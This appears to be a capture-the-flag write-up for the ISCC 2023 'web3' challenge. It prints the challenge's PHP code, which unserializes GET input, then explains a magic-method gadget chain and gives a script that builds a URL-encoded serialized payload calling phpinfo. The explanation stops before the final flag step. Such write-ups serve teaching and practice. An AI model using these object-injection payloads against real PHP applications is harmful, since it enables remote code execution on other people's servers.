# ISCC 2023

## WEB

### web3

```php
?> <?php
include("./xxxiscc.php");
class boy {
    public $like;
    public function __destruct() {
        echo "能请你喝杯奶茶吗？<br>";
        @$this->like->make_friends();
    }
    public function __toString() {
        echo "拱火大法好<br>";
        return $this->like->string;
    }
}

class girl {
    private $boyname;
    public function __call($func, $args) {
        echo "我害羞羞<br>";
        isset($this->boyname->name);  
    }
}

class helper {
    private $name;
    private $string;
    public function __construct($string) {
        $this->string = $string;
    }
    public function __isset($val) {
        echo "僚机上线<br>";
        echo $this->name;
    }
    public function __get($name) {
        echo "僚机不懈努力<br>";
        $var = $this->$name;
        $var[$name]();
    }
}
class love_story {
    public function love() {
        echo "爱情萌芽<br>";
        array_walk($this, function($make, $colo){
            echo "坠入爱河，给你爱的密码<br>";
            if ($make[0] === "girl_and_boy" && $colo === "fall_in_love") {
                global $flag;
                echo $flag;
            }
        });
    }
}

if (isset($_GET["iscc"])) {
    $a=unserialize($_GET['iscc']);
} else {
    highlight_file(__FILE__);
}
```

经典的PHP反序列化链子，我的思路如下：

1. 反序列化类销毁自动触发 boy 类的 destruct()，此时会调用 @$this->like->make_friends();

将 this->like 设为 一个 girl 类对象，此时会触发 girl 类的 __call 魔术方法。

2. 在 girl 的 __call 魔术方法中会触发 isset($this->boyname->name);

若将 this->boyname 设为 helper 类对象，此时会自动触发 helper 类的 __isset() 魔术方法，在这个方法中会调用 echo $this->name; 

如果 this->name 是一个 boy 类对象，那么此时会触发 boy 类的 __toString() 方法

3. 在 boy 类的 __toString() 方法中会调用 $this->like->string;

如果 this->like 是一个 helper 类对象，此时会自动触发该类的 __get() 魔术方法

然后调用的是

```
$var = $this->$name;
$var[$name]();
```

$name 传进来是 “string”

所以相当于调用 $this->string，若这个值是 love_story 类对象



```
<?php

class boy {
    public $like;
    public function __construct($a){
        $this->like = $a;
    }
    public function __destruct() {
        echo "能请你喝杯奶茶吗？<br>";
        @$this->like->make_friends();
    }
    public function __toString() {
        echo "拱火大法好<br>";

        return $this->like->string;
    }
}

class girl {
    private $boyname;
    public function __construct($a){
        $this->boyname = $a;
    }
    public function __call($func, $args) {
        echo "我害羞羞<br>";
        isset($this->boyname->name);
    }
}

class helper {
    private $name;
    private $string;
    public function __construct($name,$string) {
        $this->name = $name;
        $this->string = $string;
    }
    public function __isset($val) {
        echo "僚机上线<br>";
        echo $this->name;
    }
    public function __get($name) {

        echo "僚机不懈努力<br>";
        $var = $this->$name;
        var_dump("\n");
        var_dump($var);
        $var[$name]();
        //

    }
}
class love_story {
    public function love() {
        echo "爱情萌芽<br>";
        //$this = array("fall_in_love"=>"girl_and_boy");
        #var_dump("当前的this".$this);
        array_walk($this, function($make, $colo){
            echo "坠入爱河，给你爱的密码<br>";
            if ($make[0] === "girl_and_boy" && $colo === "fall_in_love") {
                global $flag;
                echo $flag;
            }
        }
        );
    }
}

$love_story1 = new love_story();
$test = array("string"=>"phpinfo");
$helper2 = new helper("test",$test);

$boy2 = new boy($helper2);

$helper1 = new helper($boy2,$boy2);

$girl1 = new girl($helper1);

$boy1 = new boy($girl1);


$ans = urlencode(serialize($boy1));

var_dump($ans);


```

